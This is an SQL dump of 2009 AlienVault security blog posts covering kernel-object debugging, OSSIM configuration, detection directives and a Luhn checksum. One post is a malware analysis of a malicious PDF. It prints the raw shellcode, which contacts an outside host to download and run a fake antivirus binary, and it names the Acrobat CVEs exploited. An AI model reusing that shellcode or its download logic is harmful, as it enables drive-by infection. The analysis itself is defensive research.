an then I found these:0x16F:Mutant                   VMwareGuestDnDDataMutex\n\n0x170:Mutant                   VMwareGuestCopyPasteMutexI think is another interesting trick to detect the presence of a system running inside Vmware.Searching the Internet I found this report from ThreatExpert  about a malware called W32.Neshuta that creates exactly the previous two mutexs.So the question is if the malware checks for the presence of Vmware with this technique (I bet you a beer) or it uses the same mutants to hide and deceive computer users.', 'directory objectskernel objectswindows kernelmutexw32.neshutantquerydirectoryobjectcreatemutexntopendirectoryobject', '/blogs/labs-research/malware-exploring-mutex-objects');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (150, 'Windows Kernel Objects', 'Jaime Blasco', 'December 24, 2009 ', 'The Windows Kernel offers different resources to developers: Process, Socket, Thread, Mutex…A kernel object is a memory block which structure has different members containing information about the object. There are common members across all object types (like security descriptor) but each object type has its own specific members (like ID of a Process object).Let’s begin playing with WinDbg  that can be used to debug windows in kernel mode.The best way to retrieve the list of kernel objects is to query the ObjectTypes directory:\nlkd> !object \\ObjectTypes\n\nObject: e1000110  Type: (823ed418) Directory\n\n    ObjectHeader: e10000f8 (old version)\n\n    HandleCount: 0  PointerCount: 25\n\n    Directory Object: e1001150  Name: ObjectTypes\n\n\n\n    Hash Address  Type          Name\n\n    ---- -------  ----          ----\n\n     00  823ed418 Type          Directory\n\n     01  823c8ca0 Type          Thread\n\n         823c55e0 Type          Mutant\n\n     03  82335770 Type          FilterCommunicationPort\n\n     05  823b4958 Type          Controller\n\n     07  823ed5e8 Type          Type\n\n         823c4ca0 Type          Profile\n\n         823c5980 Type          Event\n\n     09  823ed248 Type          SymbolicLink\n\n         823c4560 Type          Section\n\n         823c57b0 Type          EventPair\n\n     10  823c4730 Type          Desktop\n\n     11  823c4e70 Type          Timer\n\n     12  823c4900 Type          WindowStation\n\n         823eb040 Type          File\n\n     16  823b45b8 Type          Driver\n\n     18  823ae250 Type          WmiGuid\n\n         823c4ad0 Type          KeyedEvent\n\n     19  823c8040 Type          Token\n\n         823b4788 Type          Device\n\n     20  823c8408 Type          DebugObject\n\n     21  823b43e8 Type          IoCompletion\n\n     22  823c8e70 Type          Process\n\n     24  823b4b28 Type          Adapter\n\n     26  823c18a0 Type          Key\n\n     28  823c8ad0 Type          Job\n\n     31  823ec3d0 Type          WaitablePort\n\n         823ec5a0 Type          Port\n\n     32  823c5410 Type          Callback\n\n     33  82335940 Type          FilterConnectionPort\n\n     34  823c4040 Type          Semaphore\n\nThen we have a list with all the available object types managed by the Kernel.We can get more info about an object type querying its address:\nlkd> dt _OBJECT_TYPE 823c4900 \n\nntdll!_OBJECT_TYPE\n\n   +0x000 Mutex            : _ERESOURCE\n\n   +0x038 TypeList         : _LIST_ENTRY [ 0x823c4938 - 0x823c4938 ]\n\n   +0x040 Name             : _UNICODE_STRING \"WindowStation\"\n\n   +0x048 DefaultObject    : (null) \n\n   +0x04c Index            : 0x11\n\n   +0x050 TotalNumberOfObjects : 5\n\n   +0x054 TotalNumberOfHandles : 0x76\n\n   +0x058 HighWaterNumberOfObjects : 5\n\n   +0x05c HighWaterNumberOfHandles : 0x80\n\n   +0x060 TypeInfo         : _OBJECT_TYPE_INITIALIZER\n\n   +0x0ac Key              : 0x646e6957\n\n   +0x0b0 ObjectLocks      : [4] _ERESOURCE\n\nAnd ever more information:\nlkd> dt _OBJECT_TYPE_INITIALIZER 823c55e0 \n\nntdll!_OBJECT_TYPE_INITIALIZER\n\n   +0x000 Length           : 0x5690\n\n   +0x002 UseDefaultObject : 0x3c \'<\'\n\n   +0x003 CaseInsensitive  : 0x82 \'\'\n\n   +0x004 InvalidAttributes : 0x823c5908\n\n   +0x008 GenericMapping   : _GENERIC_MAPPING\n\n   +0x018 ValidAccessMask  : 0\n\n   +0x01c SecurityRequired : 0 \'\'\n\n   +0x01d MaintainHandleCount : 0 \'\'\n\n   +0x01e MaintainTypeList : 0 \'\'\n\n   +0x020 PoolType         : 0 ( NonPagedPool )\n\n   +0x024 DefaultPagedPoolCharge : 0\n\n   +0x028 DefaultNonPagedPoolCharge : 0\n\n   +0x02c DumpProcedure    : (null) \n\n   +0x030 OpenProcedure    : (null) \n\n   +0x034 CloseProcedure   : (null) \n\n   +0x038 DeleteProcedure  : 0x823c5618     void  +ffffffff823c5618\n\n   +0x03c ParseProcedure   : 0x823c5618     long  +ffffffff823c5618\n\n   +0x040 SecurityProcedure : 0x000e000c     long  +e000c\n\n   +0x044 QueryNameProcedure : 0xe1005498     long  +ffffffffe1005498\n\n   +0x048 OkayToCloseProcedure : (null) \n\nAll the kernel objects are managed by the object manager which manage all the resources: kernel data structures, kernel references, user references, synchronization…The Windows Kernel provides “Object directories” to categorize objects being managed according to the types. For example we previously queried the ObjectTypes directory to retrieve the list of object types.Another example, query the \\Drivers directory to get the list of drivers present on the system:\nlkd> !object \\Driver\n\nObject: e1023908  Type: (823ed418) Directory\n\n    ObjectHeader: e10238f0 (old version)\n\n    HandleCount: 0  PointerCount: 96\n\n    Directory Object: e1001150  Name: Driver\n\n\n\n    Hash Address  Type          Name\n\n    ---- -------  ----          ----\n\n     00  823343b0 Driver        NDIS\n\n         82335340 Driver        KSecDD\n\n         82171320 Driver        Beep\n\n     01  8217ef38 Driver        Raspti\n\n         82233260 Driver        Mouclass\n\n         8217dd68 Driver        es1371\n\n     02  82060030 Driver        vmx_svga\n\n...\n\n...\n\nIn the next post I will explain the way to query object directories from user land via NtQueryDirectoryObject [Ntdll.dll] and take advantage of it for incident response and malware detection.', 'directory objectskernel objectswindows kernelwindbgobject manager', '/blogs/labs-research/windows-kernel-objects');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (151, 'Exploits: Analyzing a malicious PDF Document', 'Jaime Blasco', 'December 21, 2009 ', 'In this post, I will explain a real case example of how to manually analyze a malicious PDF document.Some days ago I collected a malicious PDF file, usually, Wepawet does an excellent job and automatically analyze the malicious file for you.In this case, Wepawet said “No exploits were identified.” so probably the malicious PDF file uses some tricks against automatic analysis.We start collecting some information of the PDF file:MD5: 67f3da49ac07e6a5b3be1a743c3ea40dCollect some PDF object information to begin the analysis using Didier Stevens pdfid.py:mac-jaime:pdf1 jaimeblasco$ python pdfid.py pdf.php\n\nPDFiD 0.0.9 pdf.php\n\n PDF Header: %PDF-1.4\n\n obj                    9\n\n endobj                 9\n\n stream                 3\n\n endstream              3\n\n xref                   1\n\n trailer                1\n\n startxref              1\n\n /Page                  1\n\n /Encrypt               0\n\n /ObjStm                0\n\n /JS                    1\n\n /JavaScript            2\n\n /AA                    0\n\n /OpenAction            0\n\n /AcroForm              0\n\n /JBIG2Decode           0\n\n /RichMedia             0\n\n /Colors > 2^24         0Now we know there is some javascript and filter objects we should analyze, first we search for Filter objects inside the PDF using Didier Stevens pdf-parser.py:mac-jaime:pdf1 jaimeblasco$ python pdf-parser.py --search Filter pdf.php\n\nobj 5 0\n\n Type:\n\n Referencing:\n\n Contains stream\n\n [(1, \'\\n\'), (2, \'<<\'), (1, \' \'), (2, \'/Length\'), (1, \' \'), (3, \'4852\'), (1, \' \'), (2, \'/Filter\'), (1, \' \'), (2, \'/FlateDecode\'), (1, \'\\n \'), (2, \'>>\'), (1, \'\\n\')]\n\n\n\n <<\n\n   /Length 4852\n\n   /Filter /FlateDecode\n\n\n\n >>\n\n\n\nobj 6 0\n\n Type:\n\n Referencing:\n\n Contains stream\n\n [(1, \'\\n\'), (2, \'<<\'), (1, \' \'), (2, \'/Length\'), (1, \' \'), (3, \'299\'), (1, \' \'), (2, \'/Filter\'), (1, \' \'), (2, \'/FlateDecode\'), (1, \'\\n \'), (2, \'>>\'), (1, \'\\n\')]\n\n\n\n <<\n\n   /Length 299\n\n   /Filter /FlateDecode\n\n\n\n >>We have two streams that should be carefully analyzed, let’s see the raw data of obj 5 0:mac-jaime:pdf1 jaimeblasco$ python pdf-parser.py --object 5 --raw --filter pdf.php | more\n\nobj 5 0\n\n Type:\n\n Referencing:\n\n Contains stream\n\n\n\n<< /Length 4852 /Filter /FlateDecode\n\n >>\n\n\n\n <<\n\n   /Length 4852\n\n   /Filter /FlateDecode\n\n\n\n >>\n\n\n\n colkokasd assa 443562df sdfs23234266colkokasd assa 443562df sdfs23234275colkokasd assa\n\n443562df sdfs2323426ecolkokasd assa 443562df sdfs23234263colkokasd assa 443562df sdfs23234274colkokasd\n\nassa 443562df sdfs\n\n23234269colkokasd assa 443562df sdfs2323426fcolkokasd assa 443562df…......\n\n...........\n\n...........\n\n...........We have 172K of stream data, we save it for later analyze. Now dump the obj 6 raw data:mac-jaime:pdf1 jaimeblasco$ python pdf-parser.py --object 6 --raw --filter pdf.php | more\n\nobj 6 0\n\n Type:\n\n Referencing:\n\n Contains stream\n\n\n\n<< /Length 299 /Filter /FlateDecode\n\n >>\n\n\n\n <<\n\n   /Length 299\n\n   /Filter /FlateDecode\n\n\n\n >>This is much better, we have some javascript eval, unescape functions and a reference to this.info.title.If we inspect the info.title we realize it’s linked with the obj 5 0 data with extracted.As we can see, the javascript code replace “colkokasd assa 443562df sdfs232342” from the obj 5 stream with the var uWReX84wKBTnU (”%”)To emulate the javascript code, first we dump the obj5 data and then use sed to replace data:python pdf-parser.py --object 5 --raw --filter pdf.php > obj5\n\nsed -i \"s/colkokasd assa 443562df sdfs232342/%/g\" obj5We create a js file with the data replace inside var JmfNzd7NdGNhf = “%66%75%6e%63%74%69%6f%6…....... ” and then call print(unescape(JmfNzd7NdGNhf));.If we execute the file with SpiderMonkey:mac-jaime:pdf1 jaimeblasco$ js obj_5.jsNow we have the unobfuscated javascript code. The PPPDDDFF() version check for the Acrobat Reader version using the app.viewerVersion Adobe Javascript function and exploits a different vulnerability on each of the identified versions:CVE-2007-5659: Exploiting Collab.collectEmailInfo()CVE-2008-2992: Exploiting util.printf()CVE-2009-0927: Exploiting Collab.getIcon()We also found a shellcode, here is the raw data extracted using SpiderMonkey:shellcode = \"\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x0a\\x33\\xc0\\x64\\x8b\\x40\\x30\\x78\\x0c\\x8b\\x40\\x0c\" \\\n\n                        \"\\x8b\\x70\\x1c\\xad\\x8b\\x58\\x08\\xeb\\x09\\x8b\\x40\\x34\\x8d\\x40\\x7c\\x8b\\x58\\x3c\\x6a\" \\\n\n                        \"\\x44\\x5a\\xd1\\xe2\\x2b\\xe2\\x8b\\xec\\xeb\\x4f\\x5a\\x52\\x83\\xea\\x56\\x89\\x55\\x04\\x56\" \\\n\n                        \"\\x57\\x8b\\x73\\x3c\\x8b\\x74\\x33\\x78\\x03\\xf3\\x56\\x8b\\x76\\x20\\x03\\xf3\\x33\\xc9\\x49\" \\\n\n                        \"\\x50\\x41\\xad\\x33\\xff\\x36\\x0f\\xbe\\x14\\x03\\x38\\xf2\\x74\\x08\\xc1\\xcf\\x0d\\x03\\xfa\" \\\n\n                        \"\\x40\\xeb\\xef\\x58\\x3b\\xf8\\x75\\xe5\\x5e\\x8b\\x46\\x24\\x03\\xc3\\x66\\x8b\\x0c\\x48\\x8b\" \\\n\n                        \"\\x56\\x1c\\x03\\xd3\\x8b\\x04\\x8a\\x03\\xc3\\x5f\\x5e\\x50\\xc3\\x8d\\x7d\\x08\\x57\\x52\\xb8\" \\\n\n                        \"\\x33\\xca\\x8a\\x5b\\xe8\\xa2\\xff\\xff\\xff\\x32\\xc0\\x8b\\xf7\\xf2\\xae\\x4f\\xb8\\x65\\x2e\" \\\n\n                        \"\\x65\\x78\\xab\\x66\\x98\\x66\\xab\\xb0\\x6c\\x8a\\xe0\\x98\\x50\\x68\\x6f\\x6e\\x2e\\x64\\x68\" \\\n\n                        \"\\x75\\x72\\x6c\\x6d\\x54\\xb8\\x8e\\x4e\\x0e\\xec\\xff\\x55\\x04\\x93\\x50\\x33\\xc0\\x50\\x50\" \\\n\n                        \"\\x56\\x8b\\x55\\x04\\x83\\xc2\\x7f\\x83\\xc2\\x31\\x52\\x50\\xb8\\x36\\x1a\\x2f\\x70\\xff\\x55\" \\\n\n                        \"\\x04\\x5b\\x33\\xff\\x57\\x56\\xb8\\x98\\xfe\\x8a\\x0e\\xff\\x55\\x04\\x57\\xb8\\xef\\xce\\xe0\" \\\n\n                        \"\\x60\\xff\\x55\\x04\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x77\\x77\\x77\\x2e\\x69\\x6e\\x70\\x75\" \\\n\n                        \"\\x74\\x74\\x61\\x69\\x6d\\x65\\x6e\\x74\\x2e\\x63\\x6f\\x6d\\x2f\\x6c\\x6f\\x61\\x64\\x2e\\x70\" \\\n\n                        \"\\x68\\x70\\x3f\\x73\\x70\\x6c\\x3d\\x70\\x64\\x66\\x5f\\x65\\x78\\x70\"The shellcode downloads a binary file from hxxp://www.inputtaiment.com/load.php?spl=pdf_exp (Mal/FakeAV-BX), here is the analysis data:VirusTotalThreatExpert', 'malwarecve-2008-2992pdf analysispdf exploitcve-2007-5659cve-2009-0927', '/blogs/labs-research/exploits-analyzing-a-malicious-pdf-document');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (152, 'Ossim: Using Cisco SDEE Protocol to collect security events', 'Jaime Blasco', 'October 29, 2009 ', 'We added support to collect events via Security Device Event Exchange (SDEE) Protocol that lets us capture events from:Cisco Network Prevention Systems (IPS)Cisco Network Detection Systems (IPS)Cisco Switch IDSCisco IOS routers with Inline Intrusion Prevention System (IPS) functionsCisco IDS modules for routersCisco PIX FirewallsCisco Catalyst 6500 Series firewall services modules (FWSMs)Cisco Management Center for Cisco security agentsCiscoWorks Monitoring Center for Security serversThis protocol replaces Remote Data Exchange Protocol (RDEP).Ossim has the possibility of collecting via SDEE and supports inventory correlation (OS Correlation).\nConfiguration:- Updating plugin sids with the latest IPS signature update package:If you have your own update package from your vendor, you can populate the Ossim database with the new signatures.To update plugin sid information, go to /usr/share/ossim/scripts/:mac-jaime:scripts$ python createCiscoIPSSidmap.py IOS-S416-CLI.pkg.xml\n\nDELETE FROM plugin WHERE id = \"1597\";\n\n\n\nDELETE FROM plugin_sid where plugin_id = \"1597\";\n\n\n\nINSERT INTO plugin (id, type, name, description) VALUES (1597, 1, \'Cisco-IPS\', \'Cisco Intrusion Prevention System\');\n\n\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability) VALUES (1597, 5986, NULL, NULL, \'Cisco-IPS: Microsoft GDI+ GIF Parsing Vulnerability\', 3, 4);\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability) VALUES (1597, 5984, NULL, NULL, \'Cisco-IPS: IE COM Object Code Execution\', 3, 4);\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability) VALUES (1597, 5985, NULL, NULL, \'Cisco-IPS: Quicktime RTSP Content-Type  Excessive Length\', 3, 4);\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability) VALUES (1597, 19159, NULL, NULL, \'Cisco-IPS: Green Dam Youth Escort Software Update Check\', 1, 4);\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability) VALUES (1597, 19401, NULL, NULL, \'Cisco-IPS: Microsoft Publisher File Parsing Vulnerability\', 3, 4);\n\n...\n\n...This script will generate the needed SQL information to update Ossim database, to insert the information:mac-jaime:scripts$ python createCiscoIPSSidmap.py IOS-S416-CLI.pkg.xml > sdee.sql\n\nmac-jaime:scripts$ ossim-db < sdee.sqlIf you want to update cross-correlation information:mac-jaime:scripts$ python ciscoIPSOsMap.py IOS-S416-CLI.pkg.xml\n\n\n\nreplace into plugin_reference values (1597, 1109, 3001, 3);\n\nreplace into plugin_reference values (1597, 1109, 3001, 3);\n\nreplace into plugin_reference values (1597, 1109, 3001, 3);\n\nreplace into plugin_reference values (1597, 1109, 3001, 3);\n\nreplace into plugin_reference values (1597, 2156, 3001, 1);\n\nreplace into plugin_reference values (1597, 2157, 3001, 3);\n\nreplace into plugin_reference values (1597, 2157, 3001, 3);\n\nreplace into plugin_reference values (1597, 2157, 3001, 3);\n\n...\n\n...\n\n\n\nmac-jaime:scripts$ python ciscoIPSOsMap.py IOS-S416-CLI.pkg.xml > sdee-os.sql\n\nmac-jaime:scripts$ ossim-db < sdee-os.sqlRemember to restart ossim-server in order to update Ossim server cache.- Configuring Ossim Agent to collect from SDEE capable device:Add sdee reference to /etc/ossim/agent/config.cfgEdit /etc/ossim/agent/plugins/cisco-ips.cfg:[DEFAULT]\n\nplugin_id=1597\n\n\n\n[config]\n\ntype=detector\n\nenable=yes\n\n\n\nsource=sdee\n\nsource_ip=\n\nuser=\n\npassword=\n\nsleep=5\n\n\n\nprocess=\n\nstart=no\n\nstop=noInsert your source_ip, user and password data.Restart the ossim agent and it should begin receiving data from the SDEE device.- Common problems:When you begin a session with a SDEE device, it will provide you with a Subscription ID. Sometimes if the device close the connection or you loss connectivity you have to close the session in order to continue collecting from the device.Ossim Agent will automatically do it but if for some reason it can’t, you should manually close the session.You will find the latest Subscription ID provided in /etc/ossim/agent/sdee_sid.dataConfigure your device credentials on /usr/share/ossim/scripts/closeSDEEsession.py and execute:mac-jaime:scripts$ python /usr/share/ossim/scripts/closeSDEEsession.py SubscriptionIDThis should close the last session. If you still have problems you can execute:mac-jaime:scripts$ grep subs /var/log/ossim/agent.logTo obtain a list of the last Subscription ID’s used.', 'ossimcorrelationciscocross-correlationcisco ipsrdepsdeesecurity device event exchangefwsmcisco ids', '/blogs/labs-research/ossim-using-cisco-sdee-protocol-to-collect-security-events');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (153, 'LUHN checksum algorithm Lua implementation', 'Jaime Blasco', 'September 12, 2009 ', 'I have wrote a LUA function that implements the LUHN checksum algorithm (requires bitlib), this algorithm checks that a sequence of digits is a valid credit card number. Here is the code:\nlocal bit = require(\"bit\")\n\nlocal band, bor, bxor = bit.band, bit.bor, bit.bxor\n\n\n\nfunction checksum(card)\n\n	num = 0\n\n	nDigits = card:len()\n\n	odd = band(nDigits, 1)\n\n	\n\n	for count = 0,nDigits-1 do\n\n		digit = tonumber(string.sub(card, count+1,count+1))\n\n		if (bxor(band(count, 1),odd)) == 0 then\n\n			digit = digit * 2\n\n		end\n\n		\n\n		if digit > 9 then\n\n			digit = digit - 9	\n\n		end\n\n		\n\n		num = num + digit\n\n		\n\n	end\n\n	return ((num % 10) == 0)\n\n	\n\nend', 'credit cardsluanetwork securityluhn', '/blogs/labs-research/luhn-checksum-algorithm-lua-implementation');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (154, '0-day in Microsoft IIS 5/6 FTP', 'Jaime Blasco', 'September 1, 2009 ', 'A 0-day exploit in Microsoft IIS 5/6 FTP was recently published on Milw0rm while HDMoore is porting the bug to Metasploit.Alienvault’s feed customers are protected with the directive released today:45046 :AV Possible 0day IIS FTP Exploit against DST_IPhttp://isc.sans.org/diary.html?storyid=7039UPDATE:We have previously coverage with two directives present on Alienvault Professional Feed:45024: AV Possible FTP Exploit attempt against DST_IP45025: AV Possible FTP Exploit attempt against DST_IP (FTP preprocessor)', 'ossim0daydirectivesmicrosoft iis ftpiisinternet information server', '/blogs/labs-research/0-day-in-microsoft-iis-5-6-ftp');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (155, 'AlienVault/OSSIM Job Opening: Documentation Writer required.', 'Dominique Karg', 'August 23, 2009 ', 'Hello all,we’re looking for somebody to assist us in the elaboration ofdocumentation around OSSIM, it’s components and Open Source Securityin general. We require strong knowledge both in English written skillsas well as experience on OSSIM. We are willing to pay on a per-workbasis up to 3000 or 4000 . a month, with an option to get a permanentcontract if the initial work is satisfying.I don’t want to sound harsh, but the two aforementioned requirementsare a must and a strong filter. The english has to be perfect (muchbetter than mine of course :-) ) and knowledge of OSSIM has to bedeep, based on interest and/or experience already present beforereading this job offering. I mean, even if your english is perfectdon’t try to download OSSIM, check out a couple of things and apply, orif you know lots and lots about OSSIM don’t start with an intensiveenglish course.If you’re interested we’d like you to send in a sample of your workalong with a curriculum vitae. We don’t care about your nationality orwhere you are located. the payment will remain the same of course. Thesample we’re asking for would be to document the current alarm section(Incidents->Alarms). Think about a user that’s new to OSSIM, clicks onthe help in order to see what that alarm panel means and gets to thatdocument you’ve written. The desired document format would be pdf,although when documentation gets live some sort of wiki is going to beused. Remember, there are three things that should excel in thissample:We should raise our eyebrows in awe at your english written skills.We should be impressed by the deep knowledge of OSSIM that we cansee in those words.On the other hand, this is no technical document, it should be clearfor a new OSSIM user with little or no previous SIEM experience.Please send this sample to “jcasal” and “dk”, both at thealienvault.com domain. If you include “OSSIM Documentation Writer” inthe subject you’ll ensure it will reach us asap :-).Good luck!', 'ossimalienvaultjob', '/blogs/labs-research/alienvault-ossim-job-opening-documentation-writer-required');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (156, 'Infocon raised to yellow for Excel Activex vulnerability', 'Jaime Blasco', 'July 14, 2009 ', 'Microsoft has released an advisory related to Office Web Components Activex. The ISC has raised the Infocon to yellow due to the active exploitation of the vulnerabilityfrom several .cn domains.Alienvault’s feed customers are protected and covered with these directives:45050: AV Possible Malicious Server exploiting Excel ActiveX Client against DST_IP (CVE-2009-1136)45051: AV Possible Excel ActiveX Client side attack detected against SRC_IP (CVE-2009-1136)45052: AV Possible Excel ActiveX Client Side Attack against DST_IP from a compromised host (CVE-2009-1136)http://isc.sans.org/diary.html?storyid=6778http://www.microsoft.com/technet/security/advisory/973472.mspx', 'ossimsnortfeedinfoconiscexcel vulnerability', '/blogs/labs-research/infocon-raised-to-yellow-for-excel-activex-vulnerability');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (157, 'Ossim: 0-day in Microsoft DirectShow', 'Jaime Blasco', 'July 7, 2009 ', 'A 0-day exploit in Microsoft Video ActiveX Control is being exploited by malicious sites. Many people is covering this vulnerability and seems that will be widely deployed.Alienvault’s feed customers are protected and covered with these directives:45046:AV Possible MSVidCtl Client side attack detected against SRC_IP (KB-972890)45047:AV Possible Malicious Server exploiting MSVidCt against DST_IP (KB-972890)45048:AV Possible MSVidCt Client Side Attack against DST_IP from a compromised host (KB-972890)45049:AV Possible MSVidCtl Client side attack detected against SRC_IP (KB-972890) 2http://isc.sans.org/diary.html?storyid=6733http://www.microsoft.com/technet/security/advisory/972890.mspx', 'ossim0daydirectivesmicrosoft video activex controlmsvidctlkb-972890', '/blogs/labs-research/ossim-0-day-in-microsoft-directshow');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (158, 'Can OSSIM be considered a SIEM? Is it enterprise ready?', 'Dominique Karg', 'June 20, 2009 ', 'The story starts as following. A couple of years ago Dr. Anton Chuvakin (for those who might not know him a well renowned security professional and speaker) made a  prediction for 2006: that a Credible Open-Source SIM would not arrive.A year later he said this goal hasn’t been reached (as predicted). I remember being quite pissed off and upset at that time, but his point was right. Development had been slow, we didn’t have resources and everything was a bit stalled. But that has changed and AlienVault is about two years old now, we made a huge step forward and I think OSSIM is nowadays more than S/MB as well as Enteprise ready. (And sadly our resources are still very limited compared of those which Arcsight, Symantec or others might have).Yesterday I followed a couple of quick twitter exchanges where I’d like to quote the most significant ones:I agree but S/M of SMB probably won’t have the capabilities to run something like OSSIM and it’s not robust enough for Ent.@anton_chuvakin mind you, I simply asked if OSSIM had the potential, not that it was there yet… as always, I wonder, isn’t there a better way?@falconsview Re: opn src #SIEM Well, show me a sizable deployment (and not one hand-built by its creators) and I will believe you.@anton_chuvakin Will you change your mind about opensource SIEM if I get you access to a sizable deployment not created by it’s authors ? :P@dkarg Re: open src #SIEM Yes, I probably will.So, there it is, Andrew Hay (another renowned security expert) and Anton say that:OSSIM is not a SIEM.OSSIM is too difficult for S/MB and not reliable enough for the EnterpriseWell. Guess I’ll have to prove them wrong ;-). And on top I’m not pissed off, so I guess I’m growing up :-)).So what do I need? I for myself have received news/feedback of pretty big OSSIM installations and have had my hands on another bunch of them. Ranging from 100 person Real Estate companies to >40000pc governmnet environments with distributed deployments and thousands of events per second (this last one using the COSS version of course). But, the point as mentioned by Anton is that we don’t have our hands in it, the testimonial has to come from someone who’s got a deployment running not managed by us. Both S/MB as well as large enterprise deployments are valid since there are two points to prove. I’d really like to hear from a large company which is supposedly using Splunk+OSSIM, can’t say the name but that would be a good example :-).So, if any of you reading this is in that situation please let Mr. Chuvakin and Mr. Hay know about it so they hopefully can change their minds on the subject. There’s contact information on their respective homepages. Otherwise I’ll have to eat my words and admit that OSSIM is no Open Source SIEM (like in The Matrix, “there’s no spoon”).Thanks in advance for any help :-)PS: BTW, we did a first run of the webinar yesterday, thanks everybody for assisting and apologies for the, well, mishappenings. I got quite nervous, next demo will be better.Edit 2009/06/20: Fixed a misunderstanding on who predicted what, see the comments.', 'ossimsiemsmbenterprise', '/blogs/labs-research/can-ossim-be-considered-a-siem-is-it-enterprise-ready');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (159, 'sobek-hids: Host Monitoring System', 'Jaime Blasco', 'June 20, 2009 ', 'I’ve just created a google code’s project with some code I wrote some time ago.Sobek-Hids is a python based Host IDS system capable to monitor: Registry Changes File Activity Process Creation Printing Jobs External Drives (USB Disk Plugs) Shared Resources Windows Accounts Logon Firewall ChangesI hope I will have the time to continue and improve this couple of scripts.You can find it at sobek-hids', 'ossimhost idswindowshids', '/blogs/labs-research/sobek-hids-host-monitoring-system');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (160, 'Request for case-studies, testimonials, comments and feedback', 'Dominique Karg', 'May 5, 2009 ', 'A friend of mine is preparing a speech at a security conference this summer around OSSIM. He asked if I could get some feedback, case-studies or anything that could backup and enrichen his speech, this is what this post is for :-).So please, should you have anything (wether it’s good or bad, happy or sad) to say around OSSIM (or should you know about anybody how does)  which you would like to share write to [email protected] (created the alias so I wouldn’t miss anything, feedback is very important to us).Anything from “I use OSSIM” to complete papers is welcome, tho in order to avoid confusions I’d please ask to include these couple of lines at the beginning of the mail:\nName (leave empty for anonymous):\n\nCompany (leave empty for anonymous or substitute for \"english university\" or \"canadian oil platform\" or similar):\n\nIs it ok to tell/foward this?: yes/no (if the answer is \'no\' then no one but me will know about this :P)\n\nIs it ok to publish this on ossim.net/alienvault.com?: yes/no\n\n\n\nHere again for copy & paste:\n\n\n\nName:\n\nCompany:\n\nOk to tell/forward?:\n\nOk to publish on ossim.net/alienvault.com?:\n\n\n\nLast but not least, this is no commercial action, you won’t be contacted by anybody nor will you be included in any spam database; I’m just curious and want to help a friend out :-)', '', '/blogs/labs-research/request-for-case-studies-testimonials-comments-and-feedback');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (161, 'New Instaler beta: 1.2beta6', 'Dominique Karg', 'May 2, 2009 ', 'I’m happy to announce the availability of the next beta, AV Installer beta6 http://data.alienvault.com/ossim-installer_1.2.beta6.iso [no longer available]. (md5: 21204ecf2949a1d9ac9838b3c694b72d.Again, thanks a ton to everybody testing the betas and reporting bugs / improvements, with your help this is already the best release that’s been published ever for OSSIM.The betatesting process is reaching the point where we’re going to freeze code and just fix bugs. OpenVAS is now fully integrated and running like a charm, the compliance framework runs out of te box for ISO27001 (install beta6, “apt-get install ossim-compliance” and go to reports->reporting server), many new directives have been added and old ones fixed. A quick warning: OpenVAS takes ages to start the first time, if it looks like it hangs during init don’t worry, after maybe 5 or 10 minutes it will get through.Next steps will be to ensure everything is working, get a new dashboard for PCI and ISO2700[12] compliance, integrate the SEM part (without signing) into the public server, put the new policy interface in place and double check distributed architecture scripts. After this release the final version, throw a party and get a couple of weeks off ;-)I hope you enjoy this beta.', 'ossiminstallerbeta', '/blogs/labs-research/new-instaler-beta-12beta6');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (162, 'Here comes another beta, beta #5', 'Dominique Karg', 'April 3, 2009 ', 'Just uploaded a new AlienVault OSSIM installer beta, Beta 5 http://data.alienvault.com/ossim-installer_1.2.beta5.iso [No longer available]. As always, thanks a ton to everybody helping out on testing. Besides Anton, Greg, Kristian and Stephan there are many others helping, both on forums or anonymously (found some old friend’s domain names in the apache log for update checks, greets to Turkiye and France ;-))As to the actual release:\nJasperserver got updated to 3.5 (Gannt charts, finally), many bugs have been fixed, some new directives, new snort packages, new misc tools and many more. Sensor and server profiles have been updated too, as well as monit scripts and database.\n\nI expect three more betas, which would mean around three more testing weeks. There are some key features that still need some throughout testing:\n\n- Distributed deployment.\n- Jasper tuning and sample reports.\n- New policy interface (beta6).\n\nThere are two factors which we can’t control but which would make this release perfect:\n\n- Lenny OpenVAS packages.\n- MySQL 5.1 making it into lenny stable.\n\nI’ve already done some testing with partitions in the new mysql and the results are astonishing. Arcsight here we come :P\n\nIf you want bug Norbert Tretkowski https://tretkowski.de/blog.html and the guys at OpenVAS to hurry up. (Just kidding, they’re all doing a great job :-))Just a last notice: next week there will be a slowdown on updates/fixes, it’s holidays around here and I’m taking a couple of days off with my lovely girlfriend. We’ll be heading to the beach so while she enjoys the sun I’ll be able to code towards this next relelase :D.', 'ossiminstaller', '/blogs/labs-research/here-comes-another-beta-beta-5');
